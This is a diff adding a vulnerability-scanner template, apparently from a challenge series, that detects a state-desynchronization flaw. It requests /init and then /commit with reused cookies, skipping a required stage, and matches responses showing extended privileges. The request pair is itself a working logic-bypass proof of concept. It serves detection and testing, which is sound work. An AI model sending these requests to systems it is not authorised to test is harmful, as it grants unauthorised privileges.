@@ -1,0 +1,44 @@
+id: ch6-state-desync
+
+info:
+  name: State Desync - Workflow Stage Bypass
+  author: manikanta2834
+  severity: high
+  description: |
+    The application has a state desynchronization vulnerability where 
+    required workflow stages can be bypassed. Skipping the advance stage
+    still allows commit to succeed with extended privileges.
+  tags: logic,state,workflow,bypass
+
+http:
+  - raw:
+      - |
+        GET /init HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /commit HTTP/1.1
+        Host: {{Hostname}}
+
+    cookie-reuse: true
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "extended"
+
+      - type: word
+        part: body
+        words:
+          - "mode"
+
+      - type: word
+        part: body
+        words:
+          - "ops"
+
+      - type: status
+        status:
+          - 200
